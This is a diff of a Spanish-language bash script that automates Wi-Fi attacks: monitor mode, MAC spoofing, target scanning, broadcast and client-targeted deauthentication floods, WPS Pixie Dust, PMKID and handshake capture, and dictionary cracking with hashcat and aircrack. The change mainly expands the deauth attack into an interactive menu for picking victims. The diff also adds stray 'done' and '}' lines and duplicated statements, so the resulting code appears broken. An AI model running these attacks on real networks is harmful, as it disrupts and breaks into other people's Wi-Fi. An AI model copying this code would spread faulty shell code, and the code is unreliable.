@@ -10,7 +10,6 @@ NC='\033[0m' # Sin Color
 WORK_DIR="$(pwd)/capturas"
 mkdir -p "$WORK_DIR"
 
-# Verificar permisos de root
 if [ "$EUID" -ne 0 ]; then
   echo -e "${RED}[!] Por favor, ejecuta este script como root.${NC}"
   exit 1
@@ -46,7 +45,7 @@ function check_dependencies() {
         if ! command -v "$tool" &> /dev/null; then
             echo -e "${RED}[!] La herramienta '$tool' no está instalada.${NC}"
             read -p "¿Deseas instalar el paquete '$package'? [S/n]: " choice
-            choice=${choice:-S} # Predeterminado a Sí
+            choice=${choice:-S}
             
             if [[ "$choice" == "s" || "$choice" == "S" ]]; then
                 echo -e "${YELLOW}[*] Actualizando e instalando $package...${NC}"
@@ -156,26 +155,22 @@ function run_in_new_terminal() {
     fi
 }
 
-# Función auxiliar para obtener interfaces inalámbricas
 function get_wireless_interfaces() {
     iw dev | grep Interface | awk '{print $2}'
 }
 
-# Función auxiliar para saber si está en modo monitor
 function is_monitor_mode() {
     local iface=$1
     iw dev "$iface" info | grep -q "type monitor"
 }
 
 function ensure_mon_interface() {
-    # Si ya tenemos una definida y sigue siendo válida, retornar
     if [ ! -z "$mon_interface" ] && is_monitor_mode "$mon_interface"; then
         return 0
     fi
 
     echo -e "${YELLOW}[*] Buscando interfaz en modo monitor...${NC}"
     
-    # 1. Buscar si ya existe una activa
     for iface in $(get_wireless_interfaces); do
         if is_monitor_mode "$iface"; then
             mon_interface="$iface"
@@ -184,19 +179,17 @@ function ensure_mon_interface() {
         fi
     done
     
-    # 2. Si no existe, intentar activar modo monitor en la primera interfaz disponible
+    done
+    
     echo -e "${YELLOW}[*] No se detectó modo monitor. Intentando activar automáticamente...${NC}"
     for iface in $(get_wireless_interfaces); do
-        # Ignorar si ya se chequeó antes (aunque el bucle anterior filtra los monitor)
         echo -e "${YELLOW}[*] Activando airmon-ng en $iface...${NC}"
         
-        # Matar procesos que puedan interferir
         airmon-ng check kill > /dev/null 2>&1
         
         airmon-ng start "$iface" > /dev/null 2>&1 &
         show_loader $!
         
-        # Buscar cuál es la nueva interfaz monitor
         for new_iface in $(get_wireless_interfaces); do
             if is_monitor_mode "$new_iface"; then
                 mon_interface="$new_iface"
@@ -206,7 +199,8 @@ function ensure_mon_interface() {
         done
     done
     
-    # 3. Fallback manual si todo falla
+    done
+    
     echo -e "${RED}[!] No se pudo activar automáticamente.${NC}"
     read -p "Ingresa el nombre de la interfaz en modo monitor (ej. wlan0mon): " mon_interface
 }
@@ -214,7 +208,6 @@ function ensure_mon_interface() {
 function start_monitor_mode() {
     ensure_mon_interface
     
-    # Opcional: Macchanger
     read -p "¿Deseas cambiar tu MAC a una aleatoria? (s/n): " ch_mac
     if [[ "$ch_mac" == "s" || "$ch_mac" == "S" ]]; then
         echo -e "${YELLOW}[*] Cambiando dirección MAC...${NC}"
@@ -244,33 +237,36 @@ function scan_networks() {
     airodump-ng "$mon_interface"
 }
 
-# Función modular para gestión de menús (uso interno)
 function show_target_selection_menu() {
     local source_file="$1"
     
-    echo -e "\n${YELLOW}╔════╤═══════════════════╤═════╤══════════════════════╗${NC}"
-    printf "${YELLOW}║${NC} %-2s ${YELLOW}│${NC} %-17s ${YELLOW}│${NC} %-3s ${YELLOW}│${NC} %-20s ${YELLOW}║${NC}\n" "ID" "BSSID" "CH" "ESSID"
-    echo -e "${YELLOW}╠════╪═══════════════════╪═════╪══════════════════════╣${NC}"
+    echo -e "\n${YELLOW}╔════╤═══════════════════╤════╤═════════╤══════════╤══════════════════════╗${NC}"
+    printf "${YELLOW}║${NC} %-2s ${YELLOW}│${NC} %-17s ${YELLOW}│${NC} %-2s ${YELLOW}│${NC} %-7s ${YELLOW}│${NC} %-8s ${YELLOW}│${NC} %-20s ${YELLOW}║${NC}\n" "ID" "BSSID" "CH" "PWR" "SEC" "ESSID"
+    echo -e "${YELLOW}╠════╪═══════════════════╪════╪═════════╪══════════╪══════════════════════╣${NC}"
     
-    # Declarar arrays locales
     local -a bssids
     local -a channels
     local -a essids
     local i=1
     
-    # Leer archivo formateado: BSSID|CHANNEL|ESSID
-    while IFS='|' read -r bssid channel essid; do
+    # Leer archivo formateado: BSSID|CHANNEL|ESSID|POWER|SECURITY
+    while IFS='|' read -r bssid channel essid pwr security; do
         if [[ -n "$bssid" ]]; then
              bssids[$i]="$bssid"
              channels[$i]="$channel"
              essids[$i]="$essid"
              
-             printf "${YELLOW}║${NC} %-2s ${YELLOW}│${NC} %-17s ${YELLOW}│${NC} %-3s ${YELLOW}│${NC} %-20.20s ${YELLOW}║${NC}\n" "$i" "$bssid" "$channel" "$essid"
+             # Colorear según intensidad de señal
+             pwr_color="${GREEN}"
+             if [[ "$pwr" -lt -70 ]]; then pwr_color="${YELLOW}"; fi
+             if [[ "$pwr" -lt -85 ]]; then pwr_color="${RED}"; fi
+             
+             printf "${YELLOW}║${NC} %-2s ${YELLOW}│${NC} %-17s ${YELLOW}│${NC} %-2s ${YELLOW}│${NC} ${pwr_color}%-7s${NC} ${YELLOW}│${NC} %-8s ${YELLOW}│${NC} %-20.20s ${YELLOW}║${NC}\n" "$i" "$bssid" "$channel" "$pwr" "$security" "$essid"
              ((i++))
         fi
     done < "$source_file"
     
-    echo -e "${YELLOW}╚════╧═══════════════════╧═════╧══════════════════════╝${NC}"
+    echo -e "${YELLOW}╚════╧═══════════════════╧════╧═════════╧══════════╧══════════════════════╝${NC}"
     
     echo ""
     echo "0) Entrada Manual o Re-escanear"
@@ -290,31 +286,24 @@ function show_target_selection_menu() {
     fi
 }
 
-# Función maestra de Escaneo y Selección
-# Modo: "airodump" (por defecto) o "wash"
 function start_scan_and_selection() {
     local mode="${1:-airodump}"
     local duration=15
     local tmp_scan_prefix="/tmp/wifi_scan"
     local formatted_list="/tmp/wifi_targets.list"
     
-    # Limpiar previos
     rm -f "${tmp_scan_prefix}"* "$formatted_list"
 
     echo -e "${YELLOW}[*] Escaneando objetivos ($mode) por $duration segundos...${NC}"
     
     if [[ "$mode" == "wash" ]]; then
-        # Modo WPS (Wash)
-        # Wash no siempre termina limpio con timeout, usamos kill
         wash -i "$mon_interface" -C > "${tmp_scan_prefix}.log" 2>&1 & 
         local pid=$!
     else
-        # Modo Standard (Airodump)
         airodump-ng --output-format csv -w "$tmp_scan_prefix" "$mon_interface" > /dev/null 2>&1 &
         local pid=$!
     fi
     
-    # Barra de progreso
     for ((i=1; i<=duration; i++)); do
         echo -n "▓"
         sleep 1
@@ -324,33 +313,42 @@ function start_scan_and_selection() {
     kill $pid 2>/dev/null
     wait $pid 2>/dev/null
     
-    # Procesar salida según el modo
+    kill $pid 2>/dev/null
+    wait $pid 2>/dev/null
+    
     if [[ "$mode" == "wash" ]]; then
-        # Parsear salida de Wash
-        # Formato usual: BSSID  Channel  RSSI  WPS  Lck  ESSID
-        # La salida de Wash es irregular con espacios.
-        # Omitir líneas de encabezado usualmente.
+        # Parsear salida de Wash (WPS)
+        # BSSID Ch RSSI WPS Lck ESSID
         grep -E "^[0-9A-F]{2}:" "${tmp_scan_prefix}.log" | awk '{
-            # BSSID=$1, Canal=$2, ESSID=$6 en adelante (puede tener espacios)
-            # Reconstruir ESSID
             essid=""; for(i=6;i<=NF;i++) essid=essid $i " ";
-            print $1 "|" $2 "|" essid
-        }' > "$formatted_list"
+            rssi=$3
+            if (length(essid) < 2) essid="<Oculta>";
+            # Wash output format assumed: BSSID|CHANNEL|ESSID|POWER|SECURITY
+            print $1 "|" $2 "|" essid "|" $3 "|" "WPS"
+        }' | sort -t'|' -k4 -nr > "$formatted_list"
         
     else
-        # Parsear CSV de Airodump
         local csv_file="${tmp_scan_prefix}-01.csv"
         if [ ! -f "$csv_file" ]; then return 1; fi
         
+        # Airodump CSV columns: BSSID(1)..CH(4)..Privacy(6)..Power(9)..ESSID(14)
         awk -F, 'NR>1 && $1!="" && $1!~/Station MAC/ {
-            gsub(/^[ \t]+|[ \t]+$/, "", $1);
-            gsub(/^[ \t]+|[ \t]+$/, "", $4);
-            gsub(/^[ \t]+|[ \t]+$/, "", $14);
-            if(length($1)==17) print $1 "|" $4 "|" $14
-        }' "$csv_file" > "$formatted_list"
+            for(i=1; i<=NF; i++) gsub(/^[ \t]+|[ \t]+$/, "", $i);
+            
+            bssid=$1
+            chan=$4
+            priv=$6
+            pwr=$9
+            essid=$14
+            
+            if(length(essid)==0) essid="<Oculta>";
+            if(length(priv)==0) priv="OPEN";
+            
+            # Formato: BSSID|CHANNEL|ESSID|POWER|SECURITY
+            if(length(bssid)==17) print bssid "|" chan "|" essid "|" pwr "|" priv
+        }' "$csv_file" | sort -t'|' -k4 -nr > "$formatted_list"
     fi
     
-    # Mostrar el menú modular
     if [ -s "$formatted_list" ]; then
         show_target_selection_menu "$formatted_list"
         return $?
@@ -381,7 +379,8 @@ function capture_handshake() {
     
     full_cap_path="$WORK_DIR/$filename"
     
-    # Resto de la lógica idéntica...
+    full_cap_path="$WORK_DIR/$filename"
+    
     echo -e "${YELLOW}[*] Iniciando captura en canal $channel...${NC}"
     
     airodump_cmd="airodump-ng -c $channel --bssid $bssid -w $full_cap_path $mon_interface"
@@ -418,18 +417,118 @@ function deauth_attack() {
     banner
     ensure_mon_interface
     
-    read -p "Ingresa el BSSID del Router objetivo: " bssid
-    read -p "Ingresa el BSSID del Cliente (o déjalo vacío para broadcast): " client
-    read -p "Cantidad de paquetes de desautenticación (ej. 10): " packets
-    
-    if [ -z "$client" ]; then
-        echo -e "${YELLOW}[*] Iniciando ataque de desautenticación BROADCAST...${NC}"
-        aireplay-ng -0 "$packets" -a "$bssid" "$mon_interface"
-    else
-        echo -e "${YELLOW}[*] Iniciando ataque de desautenticación dirigido al cliente $client...${NC}"
-        aireplay-ng -0 "$packets" -a "$bssid" -c "$client" "$mon_interface"
+    echo -e "${YELLOW}[*] Selecciona el AP Objetivo para el ataque...${NC}"
+    start_scan_and_selection "airodump"
+    if [ $? -ne 0 ]; then
+        echo -e "${RED}[!] No se seleccionó ningún objetivo.${NC}"
+        read -p "Presiona Enter para volver..."
+        return
     fi
-    read -p "Presiona Enter para continuar..."
+    
+    local target_bssid="$TARGET_BSSID"
+    local target_ch="$TARGET_CHANNEL"
+    local target_essid="$TARGET_ESSID"
+    
+    while true; do
+        clear
+        banner
+        echo -e "${YELLOW}╔══════════════════ DEAUTH MENU ═══════════════════╗${NC}"
+        clear
+        banner
+        echo -e "${YELLOW}╔══════════════════ DEAUTH MENU ═══════════════════╗${NC}"
+        local disp_essid=$(echo "$target_essid" | cut -c 1-18)
+        
+        printf "${YELLOW}║${NC} %-48s ${YELLOW}║${NC}\n" "Target: $disp_essid ($target_bssid)"
+        printf "${YELLOW}║${NC} %-48s ${YELLOW}║${NC}\n" "Channel: $target_ch"
+        echo -e "${YELLOW}╠══════════════════════════════════════════════════╣${NC}"
+        printf "${YELLOW}║${NC} %-48s ${YELLOW}║${NC}\n" " 1) Ataque Masivo (Broadcast - 15 pkts)"
+        printf "${YELLOW}║${NC} %-48s ${YELLOW}║${NC}\n" " 2) Ataque Particular (Buscar Clientes)"
+        printf "${YELLOW}║${NC} %-48s ${YELLOW}║${NC}\n" " 3) Volver"
+        echo -e "${YELLOW}╚══════════════════════════════════════════════════╝${NC}"
+        echo ""
+        read -p "Opción: " d_opt
+        
+        case $d_opt in
+            1)
+                echo -e "${YELLOW}[*] Preparando ataque masivo a $target_bssid...${NC}"
+                iwconfig "$mon_interface" channel "$target_ch"
+                echo -e "${YELLOW}[*] Enviando 15 paquetes de desautenticación (Broadcast)...${NC}"
+                aireplay-ng -0 15 -a "$target_bssid" "$mon_interface"
+                echo -e "${GREEN}[+] Ataque finalizado.${NC}"
+                read -p "Presiona Enter para continuar..."
+                ;;
+            2)
+                echo -e "${YELLOW}[*] Monitoreando clientes en $target_bssid (Canal $target_ch)...${NC}"
+                echo -e "${YELLOW}[*] Espere 25 segundos para detectar tráfico...${NC}"
+                
+                local client_scan_prefix="/tmp/wifi_clients_scan"
+                rm -f "${client_scan_prefix}"*
+                
+                # Iniciar airodump filtrado por BSSID y Canal
+                airodump-ng -c "$target_ch" --bssid "$target_bssid" -w "$client_scan_prefix" --output-format csv "$mon_interface" > /dev/null 2>&1 &
+                local scan_pid=$!
+                
+                # Barra de progreso
+                for ((i=1; i<=25; i++)); do
+                    echo -n "▓"
+                    sleep 1
+                done
+                echo ""
+                
+                kill $scan_pid 2>/dev/null
+                wait $scan_pid 2>/dev/null
+                
+                local csv_file="${client_scan_prefix}-01.csv"
+                
+                local csv_file="${client_scan_prefix}-01.csv"
+                
+                if [ ! -f "$csv_file" ]; then
+                    echo -e "${RED}[!] Error: No se generó archivo de captura.${NC}"
+                else
+                    echo -e "\n${YELLOW}--- Clientes Detectados ---${NC}"
+                    local count=0
+                    local -a client_macs
+                    
+                    while IFS=',' read -r col1 col2 col3 col4 col5 col6 rest; do
+                        col1=$(echo "$col1" | tr -d '[:space:]')
+                        
+                        if [[ "$col1" == "StationMAC" ]]; then
+                            in_stations=1
+                            continue
+                        fi
+                        
+                        if [[ "$in_stations" == "1" && "$col1" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
+                             count=$((count+1))
+                             client_macs[$count]="$col1"
+                             power=$(echo "$col4" | tr -d '[:space:]')
+                             packets=$(echo "$col6" | tr -d '[:space:]')
+                             
+                             echo -e "$count) MAC: ${GREEN}$col1${NC} | Pwr: $power | Pkts: $packets"
+                        fi
+                    done < "$csv_file"
+                    
+                    if [ "$count" -eq 0 ]; then
+                        echo -e "${RED}[!] No se encontraron clientes conectados durante el escaneo.${NC}"
+                    else
+                        echo ""
+                        read -p "Selecciona el número del cliente a atacar: " c_sel
+                        if [[ "$c_sel" -gt 0 && "$c_sel" -le "$count" ]]; then
+                            target_client="${client_macs[$c_sel]}"
+                            echo -e "${YELLOW}[*] Atacando a cliente: $target_client${NC}"
+                            iwconfig "$mon_interface" channel "$target_ch"
+                            aireplay-ng -0 15 -a "$target_bssid" -c "$target_client" "$mon_interface"
+                            echo -e "${GREEN}[+] Ataque particular finalizado.${NC}"
+                        else
+                            echo -e "${RED}[!] Selección inválida.${NC}"
+                        fi
+                    fi
+                fi
+                read -p "Presiona Enter para continuar..."
+                ;;
+            3) return ;;
+            *) echo "Opción inválida." ;;
+        esac
+    done
 }
 
 function wps_attack() {
@@ -459,9 +558,10 @@ function pmkid_attack() {
     banner
     ensure_mon_interface
     
+    ensure_mon_interface
+    
     echo -e "${YELLOW}[*] Ataque PMKID (Client-less)${NC}"
     
-    # Escaneo Modular (modo airodump, igual que handshake)
     start_scan_and_selection "airodump"
     if [ $? -eq 0 ]; then
         target_bssid="$TARGET_BSSID"
@@ -485,7 +585,6 @@ function pmkid_attack() {
     echo -e "\n${GREEN}[+] Captura finalizada.${NC}"
     
     if [ -f "$dump_file" ]; then
-        # Intentar extraer directamente
         hcxpcapngtool -o "${dump_file}.hc22000" "$dump_file"
         
         if [ -f "${dump_file}.hc22000" ]; then
@@ -510,7 +609,9 @@ function crack_password_auto() {
     
     echo -e "${YELLOW}[*] Configuración rápida de cracking...${NC}"
     
-    # Selección rápida de diccionario (Prioriza RockYou local)
+    
+    echo -e "${YELLOW}[*] Configuración rápida de cracking...${NC}"
+    
     wordlist=""
     if [ -f "$WORK_DIR/rockyou.txt" ]; then
         wordlist="$WORK_DIR/rockyou.txt"
@@ -518,7 +619,6 @@ function crack_password_auto() {
         wordlist="/usr/share/wordlists/rockyou.txt"
     else
         echo -e "${RED}[!] No se encontró rockyou.txt automáticmente. Usando selección manual...${NC}"
-        # Fallback a función manual si falla
         crack_password
         return
     fi
@@ -549,12 +649,11 @@ function verify_handshake() {
     
     echo -e "${YELLOW}[*] Analizando archivo con cowpatty...${NC}"
     
-    # Cowpatty -c solo verificación
+    echo -e "${YELLOW}[*] Analizando archivo con cowpatty...${NC}"
+    
     if [ -z "$bssid" ]; then
         cowpatty -c -r "$cap_file"
     else
-        # Si se da BSSID, filtramos. Cowpatty necesita SSID (-s), pero usaremos aircrack -J para validar.
-        # Mejor usamos aircrack-ng para un check rápido si tenemos BSSID
         echo -e "${YELLOW}[*] Usando aircrack-ng para validar handshake de $bssid...${NC}"
         output=$(aircrack-ng -b "$bssid" "$cap_file" 2>&1)
         if echo "$output" | grep -q "1 handshake"; then
@@ -685,7 +784,6 @@ function crack_password() {
             fi
             
             echo -e "${YELLOW}[*] Iniciando hashcat (Modo 22000)...${NC}"
-            # -w 3 para alta carga de trabajo, ideal para GPU dedicada
             hashcat -a 0 -m 22000 -w 3 "$hash_file" "$wordlist"
             ;;
         *)
@@ -695,20 +793,21 @@ function crack_password() {
     read -p "Presiona Enter para continuar..."
 }
 
-# Ejecutar verificación de dependencias al inicio
+}
+
 check_dependencies
 
 while true; do
     banner
-    echo -e "${YELLOW}╔════════════════ ATTACK MENU ════════════════╗${NC}"
-    echo -e "${YELLOW}║${NC} 1) Ataque WPA/WPA2 Clásico (Handshake)     ${YELLOW}║${NC}"
-    echo -e "${YELLOW}║${NC} 2) Ataque WPS (Pixie Dust)                 ${YELLOW}║${NC}"
-    echo -e "${YELLOW}║${NC} 3) Ataque PMKID (Client-less)              ${YELLOW}║${NC}"
-    echo -e "${YELLOW}╠═════════════════════════════════════════════╣${NC}"
-    echo -e "${YELLOW}║${NC} 4) Herramientas Extra (Crackear, Tests)    ${YELLOW}║${NC}"
-    echo -e "${YELLOW}║${NC} 5) Detener Modo Monitor y Salir            ${YELLOW}║${NC}"
-    echo -e "${YELLOW}║${NC} 6) Salir                                   ${YELLOW}║${NC}"
-    echo -e "${YELLOW}╚═════════════════════════════════════════════╝${NC}"
+    echo -e "${YELLOW}╔══════════════════ ATTACK MENU ═══════════════════╗${NC}"
+    printf "${YELLOW}║${NC} %-48s ${YELLOW}║${NC}\n" " 1) Ataque WPA/WPA2 Clásico (Handshake)"
+    printf "${YELLOW}║${NC} %-48s ${YELLOW}║${NC}\n" " 2) Ataque WPS (Pixie Dust)"
+    printf "${YELLOW}║${NC} %-48s ${YELLOW}║${NC}\n" " 3) Ataque PMKID (Client-less)"
+    echo -e "${YELLOW}╠══════════════════════════════════════════════════╣${NC}"
+    printf "${YELLOW}║${NC} %-48s ${YELLOW}║${NC}\n" " 4) Herramientas Extra (Crackear, Tests)"
+    printf "${YELLOW}║${NC} %-48s ${YELLOW}║${NC}\n" " 5) Detener Modo Monitor y Salir"
+    printf "${YELLOW}║${NC} %-48s ${YELLOW}║${NC}\n" " 6) Salir"
+    echo -e "${YELLOW}╚══════════════════════════════════════════════════╝${NC}"
     echo ""
     read -p "Selecciona una opción: " option
     
@@ -726,14 +825,14 @@ done
 function extra_tools_menu() {
     clear
     banner
-    echo -e "${YELLOW}╔════════════════ EXTRA TOOLS ════════════════╗${NC}"
-    echo -e "${YELLOW}║${NC} 1) Escanear Redes (airodump-ng)            ${YELLOW}║${NC}"
-    echo -e "${YELLOW}║${NC} 2) Ataque Desautenticación Manual          ${YELLOW}║${NC}"
-    echo -e "${YELLOW}║${NC} 3) Verificar Handshake (.cap)              ${YELLOW}║${NC}"
-    echo -e "${YELLOW}║${NC} 4) Crackear Contraseña (Manual)            ${YELLOW}║${NC}"
-    echo -e "${YELLOW}╠═════════════════════════════════════════════╣${NC}"
-    echo -e "${YELLOW}║${NC} 5) Volver                                  ${YELLOW}║${NC}"
-    echo -e "${YELLOW}╚═════════════════════════════════════════════╝${NC}"
+    echo -e "${YELLOW}╔══════════════════ EXTRA TOOLS ═══════════════════╗${NC}"
+    printf "${YELLOW}║${NC} %-48s ${YELLOW}║${NC}\n" " 1) Escanear Redes (airodump-ng)"
+    printf "${YELLOW}║${NC} %-48s ${YELLOW}║${NC}\n" " 2) Ataque Desautenticación Manual"
+    printf "${YELLOW}║${NC} %-48s ${YELLOW}║${NC}\n" " 3) Verificar Handshake (.cap)"
+    printf "${YELLOW}║${NC} %-48s ${YELLOW}║${NC}\n" " 4) Crackear Contraseña (Manual)"
+    echo -e "${YELLOW}╠══════════════════════════════════════════════════╣${NC}"
+    printf "${YELLOW}║${NC} %-48s ${YELLOW}║${NC}\n" " 5) Volver"
+    echo -e "${YELLOW}╚══════════════════════════════════════════════════╝${NC}"
     echo ""
     read -p "Opción: " ext_opt
     case $ext_opt in
